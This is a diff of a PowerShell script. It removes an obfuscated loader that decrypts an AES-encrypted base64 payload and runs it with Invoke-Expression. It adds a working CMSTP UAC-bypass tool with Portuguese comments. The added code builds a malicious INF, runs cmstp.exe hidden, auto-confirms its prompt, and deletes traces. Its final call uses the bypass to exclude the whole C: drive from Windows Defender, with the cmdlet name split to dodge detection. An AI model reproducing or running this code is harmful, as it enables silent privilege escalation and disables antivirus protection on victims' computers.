@@ -1,39 +1,194 @@
+function latencyx-Invoke-UAC
+{
+<#
+ 
+.SYNOPSIS
+Este script serve para fazer um bypass de UAC (Controle de Contas de Usuário) em um Windows onde o usuário atual está no grupo de administradores e a configuração de UAC está no padrão. Ele eleva os privilégios de maneira transparente.
 
-powershell.exe -WindowStyle Hidden -Command {
-    $MFqBqCuq = 7685
-    $DMOaVjNe = ([Math]::Sqrt($GJrWkZts) * 23).ToString()
-    $ExgFxUTE = "7"
-    $HyUOYALb = "O"
-    $cokMOnPn = "7"
-    $WhmvwoLm = "P"
-    $ewFiOyZm = "A"
-    $KbZwEDaQ = "J"
-    $QFczvsda = "B"
-    $jpBoArRY = "K"
-    $nnSCgrsw = "f"
-    $XNkvljkO = "T"
-    $iEgEAliM = "C"
-    $YMykpxaZ = "i"
-    $pcTJBYLN = "z"
-    $MpSVnjXH = "X"
-    $SMmAHqus = "A"
-    $pRArivOe = "U"
-    $t1 = 13 + 33
-    $t2 = ($t1 * 7) - ($t1 / 6)
-    $t3 = "7" + "O" + "7" + "P" + "A"
-    $t4 = "J" + "B" + "K" + "f" + "T"
-    $t5 = "C" + "i" + "z" + "X" + "A" + "U"
-    $p = $t3 + $t4 + $t5
-    $a = [Text.Encoding]::UTF8.GetBytes($p)
-    $d = [Convert]::FromBase64String("WpVb3Z91TUuDO5Afh7WdLZYPc5BGvbsMkFDWsRa0e23DUgWGlzBGebNoITB5Mu7BH3JzwnmC4h35I0cfwi3CbZcMknEC5RfWBXc4bCFY08a4rAIIKCBj1sqGUvAMjyRurdJTaON8FTSTZwThYQmTj5HjMgRghiGwgcxVdRyW3iujDhBSKmzjVj3kw8x2os84IsaN4qB04OVVkvD04baI42WCp/T8X5vf6xB+8bODCi2L4pTwy8C9lWbkkXRDp2VemHgKV2A6B3F8jHaSuQMc4IoSRLb2vFPAi8oP4tn/4kCDpWLa8PTIS44uiUhPoMuoAW0dKWdMh7gt8JOgG5P8nkHK/QxDs6wkFp9/V4RTiEOgiCz7PUXpRrx7O1UoQhmu+M7w9CHF2t4oENm1BQFrUCgKzmpqOy8ej+YdU5Tia1DgSnUf6GjsYZjBpEctzmmrSkkTLGr8ffXXrbjHUPfqXlWPBUHiCQs+/t03QFyOzY2/WKjws3Uqvg0CKbetdrcYU3VvsoV4Q0nyZ44m4KEkhyvdKCzOnxXN/GdPZ4dstxJxjoJUrmz2qlBJFbtI0iW0bToyB9kTcUYXhAvHyy2Cfx36pPjRfJ6n+a17W/YNqa8digJ+Px1KR5b5KWXgK9el7IZiAQWPKwYNlWi64hhbnefDmHGzbGJ42tFqkqfPWOqdW6iyuntHDNGBKpwq56InkAzWEnHNb/wo4xftg093jDXVq/zmlmuIWv+XyidYPlZXQ2QoNPQHoLqF8CMdsrVuoSfr7LFCWCU1qUxWfXs8v+3WVYvSYPfcvWmQkwtWoyYoOX8skMDf2rzEWvGrn0hq3XDmtYZLn/+uRYcdgK1/qwyiYm6gQpGmua0Vl1HWIAZJx/28cKY3s9F7y+3hmVdEslfGlwUd1JkLD5zrJqGEBitmxtDUpmqfP84BZPwaGphskt3mf8Yeh858nVbZjeYLm/610AYeIwEmHyC4761Wuu8v04/aQNw/ZzlSThp9bOO9oqG7hOLrUpzAPOazucUTdWs9CHS7QUbXj/ZYZtqtfMvzIK3vnM6/8eQXCaS7Fg43jnn5t/3nJ+pONqBcSKFybEp3XHNLsSuBNVVum2TJv17VVO7TQQHYwvR7bp2IHJsbYGlAnpIcPjEqTjHhUk6f5mkBzSLE83LybYI9PFSThGKfx23ZPbwVSmJxljBt5W6zS95H3e5YPsF7s59OFK9ZpgTouQ1RqVxLvArzo5RD5ErolV6cEoLG1sq4OxcnY9SC5Tz8enpDHCsjTHWCMjgG9J+Xk4K9Xa3KXAhwbRsppHyQmOjFer2zCIuMJqPOka0vdgQsyw8bwO84lBpBevs5ujGv9+gHddJWU5nR6xPlULED9cXOnFmxaFHs8AT1BfdddRQMYa77AKe4uvMY1ujFYqc0b+4qnx73QdEKbFJBbjTMdcjQ89NelW5W5MfAtGzciNSNwbBkKM1msEDHzhs25x0aa05m6T9MLMQUVbzt3LlP0dtZLbNgcxV7PXRjExcqmXyMxtf0nwqJ9jhPTBYsxfjpPdhIXW0IPR+jHvm+FsBzbaBSIxqSAz5K4Z1WQKl5bdZDfiZrd0gTE6CzshKVFVN0fny80TrsNEwCAdUXJaPOAkiJVlMn9j6uL8KDEHvDlX+L25HvFqquH+XpbWAijRPI24IIBUPxdNdMTo2aOsFLZQjr/rO/A3CkPBZQMYP0Y7v66Qe7zbyB8AuVVfNArCuLAnUCV4pjzeILta5T3l3PGT8WpBt58aSDwHB2sm41ai5EmaRrjXIQ0UUCgGO0PQQvwS79uIKzW7qlOCwNeUMzyCT6DoRTjOLZulm6Gsnfc6EhYPcnZxyLgzcslIJUNr5XY1zmhb07X3CwClAg5i1jJUvAoExel0ZFH+6oMth2M7TjnZH+0HoV117XtoKKmPbsFpgptbM8dLp2oGc+UUoCI1nqFRFvSpzpgDsj6biBOb1EObxThpHmMa0KB0mkZEjsxwQjbudHwNGKjTCXzJlwWOHdjYEuO1WVaNrodrHRvmk4OoA3I5ZDeKVSHhPci8wGH+oNaFoOT+nM1pf1v9zhtT8aqJC8cFuVfDEShyk3Uxa5wUXclYq+BaKDo+YXKeUCjrfwrMa5gLEYhhqIKfy3tX/Ib40qRFyQbP5eBBmQ/Hhv+sJ6Weioxfj7luY7FUdpx1pI1uNOXec4tTY7FDtNpnyIYn2gBBl8snmYDgxWoIQHWEma9uiMl4p1ZT2S5AAiXwmzyVWpOPdm0HrVvdab4AZDo8WuYZLiJd7qoAvb6VoX2VuV28FlwGQDOU7G/U0deQEf4Qo9JJ8zs0nrStnrk4wCih9zNm6pvDqnLvvr+WNtEzJZAL/xiiWV/WV+NbNDGtFlmnYMdBFUZMjaTEJExJdg6aPxLfHTxUxMY1D/3tbSb9WQo7Q3h0zvAHE436y/RGn0A/xgaUAYos23uU3FZWlqZ9EAm9kLDKpiXZ7mL5Yqgf8LYx0uWuI0c62Ln9Eak5+AQIKAegCQNkO5R+3+42G9G1bPMYfMsrxjD8gF42+5oJ8dKGU3J/nkjM0NxCWRAvD29yJSxsxvt1Dn6OCMZ9grhkKqAV++NS7amyb3PwUhTV3Q1p3aG8uvpp++uXeJJhjn+4X/uN1HACt1RT9cta3Bq0Li7gFxkQZJ35OnBj4ydKOkqLdvYqQBcTeFlgy8haKHu8MTnrLD3XSk4wUifi9FwayfO9SJTqQfr6ljW+JgTwuE2ihsdww0Wgjxbymg4hLHHjOk5FLQX4RIMcnf3qLM0Qi3ehj3FLwvLNdolRVkw/1OYM0BDIa8amqJkKbUh1j7A3YExoHabLvDJjMjcFJ4G8uPQWfbryM+PXxQ3PB+C2qGSDKxcpCJhuvKTlYmjGMzuhfvfScGL+8U8EPFZP6dSQSjsIAoK888Jxz97SkSzzQhre24sPcYSuv/Rn8B3tqCNEIkBD17Bw2F35MvM9vQnrpRHth4f50gADuLAFXQgR3xw7Ct9kpFhvORN796zqAxdYRUavxgR/pEhLlCtEOPzHp8FGjXyOIGMb6hpyVxXvADa3W+Tgb+UtP69qWs77SoKZdj4CsIFgoVNqEL2IBetqT6x+m35WGaN2KK+SHcUlj7BxguZPwK/xM6pa/FKC9OGfPsxFkr4HhT2nQL+IANdKy4NA3ParZs1tYEGyxQ1XQrb63pAItiKxLkGHNWb8RAFiffAjRCpUWHlyFg+NTLW8fmW2S3kDgNrv1kc1OM9ePibItvI5p87UjwwMy8eQkBIIalPpMR83+ETKo6zYIZdDUqdmJwBdZgtD14bvH0rD9tNK9ci20cD83HKCEAC34/Mh9jTUq2DdGQjtU9Q6AwqN307YoeYfAxvch5s5hbo5cbWBswJhaYGNB8+W5MEr0SV5W3Io24zk/e1IXx50dyYqRk69WCHLTPqGYYXHco5ZthmZChsk8as0KEmtHjkFFiVMP2sll6aGnWLr4wmRL+wQFyKIfPbSq2lbWi7AM/YLY+pXWT8m9juY4DNmDhdA0OPsrvs73gdVwIWAxbMOH4NjgS/LWyAfxHUsqdRayfWmXq07wNYd2WjW/45sogTzdoXWsImx1vgtP5VlwcsBQN+4kASm9ZX/G9f6RFTTw4AKfKYviFBZDLx9zTbWsKAHMCpUrsORP/jYZLyKvB8z5puuULHPledXw5jlP9kyCbfUz4CZTBhsYm+xLzsgrGwuMYs1fXe4u4t9QSBRDVFsDpHJjcRt5Z6I48/bdKzpq5yWC3xkGnKlhc6ruD7yhyQMSjxWb4BwgD33/e7lnrQ6As10vAScLUVP7b4ERGpromBVifK9hyhMeMaE9uByOqCAWOpSluyXs0MZQmraeJW6o/kPSXJUbJpUjs3P3olnn6NDx/HXIzj3oeTQks8/eMWdU4XPOpxGkmdy6o1cfkiV+z4fY0/EjRP+aZw4VyiLR4qY9TT2znfkwau23tBBtmpDt75/pd9gFFi74EDx9p1n8nLXJNMlh8Xjqh8PBExNsyGRDz/QMBo4tNq7odHSx0yxCBqCEzNgqD7wh8z+X9pyzE+OFYINGGQoirWcYki7sPyuMyYR+2RggRQ+rsNZWfz0MjcClCKXrDWYq/c1aTwaPecy0GkItL2fgyVpnAUuK2q4+RxXmcCNrKDZ6YIxjZ8lHjYnuLeTB4plhcCaToyIs7w8ajHzap3ThqUHNq1vCMHMoJX1eQwFF2doZvFNM8nEpz1ZE+c6WFptb8J5UIljZ0bK1J0UzLjP+vCegWbEL1Ybym3o17S4CWu1iurfDZi/qN8ouHNm9A/Em508sPtTrg5ZZFyK++iBAGvSNNDVFMMXIMppLpv+yod2/5AfkKN6MtIf0gRWRM+Q8frSEr+wNhOm1BuvGHt8AbgPtJKJNFkq3HHesyQdwSGQ8ToW4J2i1+pjPrfhNOoRWK48BWgnwSBPgOrZxD4sw2+NSZ2kredg8wOClG6wKl7+3qf+u/T9RDMfhSzf5rQG3ITgVblxnNxb39YucdFPGNUykb3jWjblQLdW3Aczga8yX+P3pBBF17wTBmpa+4lYqfOQAlpSXBXHp3IRlVSS5yu08hDhQuD4mbTnd+7PH5L27E+Y1mZUxD38CtPh6rJdNMIbmUKSi8c5iLCNnS/4u+uQtaTFCZ42TYHFoji+G0LTETQCj7h4mvPKSHfXF3tTYSmdDTKMuN6pdI/jXQjYQOfitB2HGIC58Qi1y7foY2+Fbwry5MW4YVgyBvgIUXFQfPzu5kgANiA+14t0hjTgiGBB7SpbxHREY1TsPUf2fZkmt9ZSF+KPxDkDAWn+/g9VxdoBbpmNQk2YrBe88Y9hvknglWyRYN+hq9u7AyyVRn0Db4IvH9/oCyv8dPnU1mEwqDgF31JXFrrGI1gUabazKae0b/k7pYFAOtCcgqzxJjZe1+0waH6INEDj40GNjyrUGjzsTtqXkulu/FJ++aTNhPqB97An8Z6C5IkowelEq94mJfv3WS6Md/DUskRwdUhplqIy/oqETgmK/nDBxfQwxlGGcqB6fdDEqZ5UxyebJeRwqVuY1ZAFWuwzmAXqTHW6Lc+mWnWq9slesiI92L7jml+lEtU8gO/tzVPu6bct/YnifW4N/dtjf+6+qpIi+leg+ch1upfVqHqz4Zde/p+gRzWKlMxtepfuiaYjSzCHqVwJB9LsU+cayecMs8ys11C5nCTTFbTvKS9YpMWyXtn++FR1sQRhk3BD57BoP7FRS5z3Hir0wg6hkaMWD++rSnWimz77GGyfDlmssQYhLq5FbxV1Wexd5WsFSdppy4g7cckwAbSd822YlhnGZvQKt0p85kZcWk3dPnTtlr7HJeJXv7zio7b16ihr5zTvVmR+8j1gFdW534gzju1Kpnn4KVuRQ4mrfJgT+rK8lHpknMck5NxV9L+ktukt3uAkUMaufrqMG+QiuMsDj8USgIzsZ15CyxTgjQ1WCXDTs0pyjvfUdOeolluO6ArL0F9VGubhK94jm85oN0Lcmrag9HevSgq6b3nJjkJax/g2fRLMcLuPnUj3Gn0IWXoox9VUqvfgAMO1NAOaDxm6Hq9eJ78+iZr9RRO8TM3m698kTXmp8eNPW2lx6oDAQKFLLGLu/AeVRjGBiFGPXlBFg7M4/zdbTOvMa1gphNpplfHfivNRx7VwMs+08fQmzLh8hCHSzdDsk/wveADjriX7fdEwqLPo22oU8x2lN/HL6Fkeu4yYxGr+58yVIqFsr04+cN7r1a+5AniywZygd4s2JTuy/2wWbNQO4qpztZV8v/jj20zfzDcQj+c6t8ww0QSjMLolOnR+91bVuooaqpY1MLzRllQLo5FZvgH2LxZCGI1QsDnhLFC/0OXgM+m3xnp6LKaS0Hs8EBl4KyMKK7p8nmlXEp+6Swmwgl2ACFbD8RJFi8ovnD+Nr1LlKfZD/+g6uMJgaWr+OxT/oDFc3KuHrg/5puVWPvd3fkS4O6g/RW2VvgbaxnNTztl3OtflyJYRCZELPY/HN9AIB2vFQRC4fVeTyCXIsPdIodG29A095WoND7mwZaZl8Dm4Ey9+BaQANk8iMvFK5c67C+jV77U/+/JoNdF5n5+W9h9FSRfjJgM3tKOP3bC45FJzFZCn1ycQKj47SXT94YDNbLWCeFIXVHsfRKKdCOAmLtqY8qbC9r11Px6lIX2G/pBMf4E3xkDnthptbrGoueMTj0dK7wioPDVeCjtzxwlwxM9RLjnx2mk0TVRe9Eo0xnT07pTA+PvFTWMSBUUBMBabD+yAWb3THDhsYOVcQYkQ+0GRua2pb2/O8DwsM+NeyJF/jjbzoe0fQooklWbUm75OAnVcBzakA/Ueuv7YYDFOId5UObxNu4Jk0qDcpTf1N155pz7olgYfcDi62DpJ3TY6VeYJlJq7SU7ytcg7dMydQxhfpldeZZJyqiFyx7QUDy2d9RJP76+W/Maxm+TcSOu55JxxIahg/94N+eoynVIYcDEn2yZ/waeCXJIvtgZYY3S2GmrtUkGEVPt23swI0yF4vmm4mEHsPP/izAgTF2DBogbVNrRkP8OY55yu0gEm3bnezgaC2pcy9WxME4nOHM7KTtUjslcK9ZKjGsN+tQv6QpzVc06mwDBKSxXETGwx0eIYrR0HSAxxqo39JcJDxdhU0bzlvKyfhr1wmP4BJ05dyOsOQKLlSb+F+fRnAgFkhZxG5p0Xygs1j8zCxCcpzW+epE/Z8tmzftrtK24f7r+0nVLXrJQiqqHPwPGlD9rFIklw6IG1UFNdE6Er32/K7Yk3UGUDxP0WghGXB61m7ZsjU6wcfAV9c7XsOyrONxgyFebOZ8kHRRVZM+QnZ7s2bAxf4xB7buHLdrM5k9WX9h7BKm2c6VzSUAHmASATGs3h6e/T+/G7889r7RI0iLq4KzWSKRqfEZV2LJnQwQfPPni7J8JgvouLV7/TVgPlEQj5l/3ycLtvPDG7ajV2tYn1ljp1V2AeNKIgaFzWgxAWzi/BX/2VXMZHxILuAnr3a+cXNAgCVxzfPmiv4huVuR9P3FW7RHfqfM9CAz30ZyWpHpRgq0FP/AA8OS/OQt0KwasmrqJbIv5WxiZwOo275iYwBef+6nHljJM12vM1lDfLmdwfZb77l5rCqkigH0gMSl/VWI15NaI6vdNU+ZaagPuR7ogMsxy0TmmlQEAPZWngTaCbkYj6MtKpoUbSjJHvcQLd7iI+s0shhhH4wOZ2arQ7vzHibaZfSgBLzRsVYK+V6A0SdNYYbtqSIPFD5A9YWipCuPXW7PWRdlwfuN88+UONDT4RiMkmrKAdONYZCxdahagU/oXKqpVIez8srAjvHG4ZFtw8goqOHH5lL7NSy6TPWn5U5f5PdsMDYDZ7ul217NaPHuPVo2VNvKcnJB/UGRrOA1YF9h+JlUQ+jXHkFlNpUY2rNIm5rcRALIy5fnIX2rt7gvfTxQ6/ND8nitQq9Qp8BMw8hM4QhqlrBt8PXP7C86WvhrJ+EnOzhl9HzRQDIJ7OUK+z75t7mw2It8wnoe/RrejxKcg0fk3ICrW4O/wUJFFn4zyLxSKTKBW+HPHAUVOHZGvqEIBnXICQscjm/vxjZnvIDnA4VN5cn3f3nJhNc9QyB/2FUKl4YYFvhUVM+IkUQ2X9lVM0ekh19BB0gZD6Ze+4CNfhv9V4TB8G3Mj358SufR4zaj4JAeOV2TbhA6TLZKIIzDQzVMW41fBfdvrgGv4UxCuUHYYhUFhh44wtEFyBbvp2DXIoMm9Z2lVMgHvgzextairF5nflSgIZkmxVUG1J0ABDBXUMFTlPjcJ+Fy6PngT8OFZjKkGqOE0xk04SKF0+ZnCSeOgMc/5tDWGtV6spNO5KfTrVrX6urQe55BxcOrpWUDXTk+Qn6tXsxRNH+tlVq0aa/YGj3Lrhfgld3Z9Uh8r7fIDHLfEtktF+S9fri/cVc+UUqGAAF+SGwF0JnEs8dR12WbhNNPxZu7BpkxsFlmN6VgmB42pb8kZaoIQtiIGToINwpdmwMbonfKf1nJWFSp9fIktYbITZWjR0sD/hY3hIFmNRVn2IiMO7tTlTe4e9JHfaqCdgK+zs78ene45uWjRCkFYdUKJjFejFjXwza86ddpPNMJOVriCfHwFTDqRi0RAbYhXJcA0NoZGeFDhkLqTP3ZB0ktaVFHk14wv5FEKH8pqHT9b8T2DvyDS1dlUmKfbWQEgLa378426yTDQtlMfUm+1AmhZCPdDn+vOHhOSXBWX3qrs29RPC/Oj/YGxg9/Sd573FR2RtjAzsj43gcmdN8VbE0d4+qxQdiwAPnavG1kfUk0bb7FvaccIUYt8zn1LnOpPyLGahPQEnCn1b5qrggLsxAjCwh+B01KOK+DabW4T8VfaCvSSVP4hyUh8FML9VLQgdPV9Y+sfKsCf73NR/1+aNJnQDHNy4pivdAYLig9ws4iERiLX/SzkcY8gb6fUCpmmxEJoNxT1pV54s3Rsmjb6VRCYdETwJjX7ZOqyAvxNMjqYjMuzxkT/m85SslmZxqdTnz1YMX4QnpEZXFjR7oPTX/uraGCmQZYKz6OIitF0pqOTbOZ377ISOYxJUptbywcT4671KBg2EDXqIw/kuBZ5ARVw0DaqUnsYjE8YnvjpXzrVXHKdy+OM5yv8KKjakO7G9cQrvSg9GNbYsKX1dsKzAIo2UrzezCxdwBeR+AmqP+XmDYu41eljaXhti4FWNruUF2c+UkTCXpfMqKdZMPLZbuMNR5a7HkygbX5K8+j6XE/805X4A43XNBZ8O8HgwOs+SNAw60BN2IgBQutAJiDUdF26zJobuBTlfq1IjMJQAOgrehkC5syGfPDJ8/NF6B3x2HaNnUELHJh7xjMkgacBJSx+yDsoYp3VhclJ0L6rXrxgtMaznnv+A64XLsqyo/OaYFc+pCQU1pSZWoAAEYgmore7gUfasBil1ZKGwgQVCiQhWBMtImPd0oUKlVkeNAbouYJq0QeunNcdPuE6fvHaaJD0lGWywxVB4D1JG80Vxk+TRcN3hzNDc1p/iQdUHowgGjjvJ58dRgX0dCYYPqjm7CVv6qhlfgcviMBxTZ3z8n/qT1gq8cegFdb/j2bI3W0Mxb54nktvrAo9qKJ+i4Eb1oT4e4o0NJmv3YkuENmWi0TUJ35pEW18PLojbz3Z/aZtLXmBWgzTvadulwzUuuNwMNapx6nNybOxNYX4i6HP9yacqpV+hWlclWr/iBZwp7mGQFqZh3gSnb/hsuQOC9udFK1EKBGQtNYyyRHFoG3k3Fl7DrSl69gOlhFmKVofde+gQ0KsLRU/LR9EmVCT0vQ5snkYtyTA6/QwOU=")
-    $i = $d[0..15]
-    $e = $d[16..($d.Length - 1)]
-    $aes = New-Object System.Security.Cryptography.AesManaged
-    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
-    $aes.Key = $a
-    $aes.IV = $i
-    $dec = $aes.CreateDecryptor()
-    $out = $dec.TransformFinalBlock($e, 0, $e.Length)
-    $res = [Text.Encoding]::UTF8.GetString($out)
-    Invoke-Expression $res
+.DESCRIPTION
+Este script usa código em C# para ser carregado na memória com PowerShell usando reflection, e então invoca a função `latencyx-Execute` do código C# carregado, que executará o comando com altos privilégios (administrador).
+
+.PARAMETER Executable
+.PARAMETER Command
+
+.EXAMPLE
+latencyx-Invoke-UAC -latencyxExecutable "powershell" -latencyxCommand ".('Add-MpP' + 'reference') -ExclusionPath C:\"
+
+#>
+
+param(
+    [Parameter(Mandatory = $true)]
+    [string]$latencyxExecutable,
+ 
+    [Parameter()]
+    [string]$latencyxCommand
+)
+
+$latencyxInfData = @'
+[version]
+Signature=$chicago$
+AdvancedINF=2.5
+
+[DefaultInstall]
+CustomDestination=latencyx-CustInstDestSectionAllUsers
+RunPreSetupCommands=latencyx-RunPreSetupCommandsSection
+
+[latencyx-RunPreSetupCommandsSection]
+LINE
+taskkill /IM cmstp.exe /F
+
+[latencyx-CustInstDestSectionAllUsers]
+49000,49001=latencyx-AllUSer_LDIDSection, 7
+
+[latencyx-AllUSer_LDIDSection]
+"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
+
+[Strings]
+ServiceName="latencyxVPN"
+ShortSvcName="latencyxVPN"
+'@
+
+$latencyxCode = @"
+using System;
+using System.Threading;
+using System.Text;
+using System.IO;
+using System.Diagnostics;
+using System.ComponentModel;
+using System.Runtime.InteropServices;
+
+public class latencyxCMSTPBypass
+{
+    [DllImport("Shell32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    static extern IntPtr ShellExecute(IntPtr hwnd, string lpOperation, string lpFile, string lpParameters, string lpDirectory, int nShowCmd);
+
+    [DllImport("user32.dll")]
+    static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
+
+    [DllImport("user32.dll")]
+    static extern bool PostMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);
+
+    public static string BinaryPath = "c:\\windows\\system32\\cmstp.exe";
+
+    public static string SetInfFile(string CommandToExecute, string InfData)
+    {
+        StringBuilder OutputFile = new StringBuilder();
+        OutputFile.Append("C:\\windows\\temp");
+        OutputFile.Append("\\");
+        OutputFile.Append(Path.GetRandomFileName().Split(Convert.ToChar("."))[0]);
+        OutputFile.Append(".inf");
+        StringBuilder newInfData = new StringBuilder(InfData);
+        newInfData.Replace("LINE", CommandToExecute);
+        File.WriteAllText(OutputFile.ToString(), newInfData.ToString());
+        return OutputFile.ToString();
+    }
+
+    public static bool latencyxExecute(string CommandToExecute, string InfData)
+    {
+        const int WM_SYSKEYDOWN = 0x0100;
+        const int VK_RETURN = 0x0D;
+
+        StringBuilder InfFile = new StringBuilder();
+        InfFile.Append(SetInfFile(CommandToExecute, InfData));
+
+        ProcessStartInfo startInfo = new ProcessStartInfo(BinaryPath);
+        startInfo.Arguments = "/au " + InfFile.ToString();
+        startInfo.WindowStyle = ProcessWindowStyle.Hidden;  // Oculta a janela
+        IntPtr dptr = Marshal.AllocHGlobal(1);
+        ShellExecute(dptr, "", BinaryPath, startInfo.Arguments, "", 0);
+
+        Thread.Sleep(3000);
+        IntPtr WindowToFind = FindWindow(null, "latencyxVPN");
+
+        PostMessage(WindowToFind, WM_SYSKEYDOWN, VK_RETURN, 0);
+        Thread.Sleep(5000);
+        File.Delete(InfFile.ToString());
+        return true;
+    }
 }
+"@
+
+$latencyxConsentPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).ConsentPromptBehaviorAdmin
+$latencyxSecureDesktopPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).PromptOnSecureDesktop
+if ($latencyxConsentPrompt -Eq 2 -and $latencyxSecureDesktopPrompt -Eq 1) {
+    return  # Silenciosamente sai se UAC estiver em "Notificar sempre"
+}
+
+try {
+    $latencyxUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+    $latencyxAdm = Get-LocalGroupMember -SID S-1-5-32-544 | Where-Object { $_.Name -eq $latencyxUser }
+} catch {
+    $latencyxUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+    $latencyxAdminGroupSID = 'S-1-5-32-544'
+    $latencyxAdminGroup = Get-WmiObject -Class Win32_Group | Where-Object { $_.SID -eq $latencyxAdminGroupSID }
+    $latencyxMembers = $latencyxAdminGroup.GetRelated("Win32_UserAccount")
+    $latencyxMembers | ForEach-Object { if ($_.Caption -eq $latencyxUser) { $latencyxAdm = $true } }
+}
+
+if (!$latencyxAdm) {
+    return  # Silenciosamente sai se o usuário não é administrador
+}
+
+try {
+    if (![System.IO.File]::Exists($latencyxExecutable)) {
+        $latencyxEx = (Get-Command $latencyxExecutable)
+        if (![System.IO.File]::Exists($latencyxEx.Source)) {
+            $latencyxExecutable = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($latencyxExecutable)
+            if (![System.IO.File]::Exists($latencyxExecutable)) {
+                return  # Silenciosamente sai se o executável não for encontrado
+            }
+        } else {
+            $latencyxExecutable = (Get-Command $latencyxExecutable).Name
+        }
+    }
+} catch {
+    return  # Silenciosamente sai em caso de erro
+}
+
+if ($latencyxExecutable.Contains("powershell")) {
+    if ($latencyxCommand -ne "") {
+        $latencyxFinal = "powershell -WindowStyle Hidden -c ""$latencyxCommand"""  # Oculta a janela do PowerShell
+    } else {
+        $latencyxFinal = "$latencyxExecutable $latencyxCommand"
+    }
+} elseif ($latencyxExecutable.Contains("cmd")) {
+    if ($latencyxCommand -ne "") {
+        $latencyxFinal = "cmd /k ""$latencyxCommand"""
+    } else {
+        $latencyxFinal = "$latencyxExecutable $latencyxCommand"
+    }
+} else {
+    $latencyxFinal = "$latencyxExecutable $latencyxCommand"
+}
+
+function latencyxExecute {
+    try {
+        $latencyxResult = [latencyxCMSTPBypass]::latencyxExecute($latencyxFinal, $latencyxInfData)
+    } catch {
+        Add-Type $latencyxCode
+        $latencyxResult = [latencyxCMSTPBypass]::latencyxExecute($latencyxFinal, $latencyxInfData)
+    }
+
+    if ($latencyxResult) {
+        return  # Silenciosamente sai se a elevação for bem-sucedida
+    } else {
+        return  # Silenciosamente sai se ocorrer um erro
+    }
+}
+
+$latencyxProcess = ((Get-WmiObject -Class win32_process).name | Select-String "cmstp" | Select-Object * -First 1).Pattern
+if ($latencyxProcess -eq "cmstp") {
+    try {
+        Stop-Process -Name "cmstp" -Force
+        latencyxExecute
+    } catch {
+        return  # Silenciosamente sai se houver erro ao fechar cmstp
+    }
+} else {
+    latencyxExecute
+}
+
+}
+
+# Chamada da função
+latencyx-Invoke-UAC -latencyxExecutable "powershell" -latencyxCommand ".('Add-MpP' + 'reference') -ExclusionPath C:\"
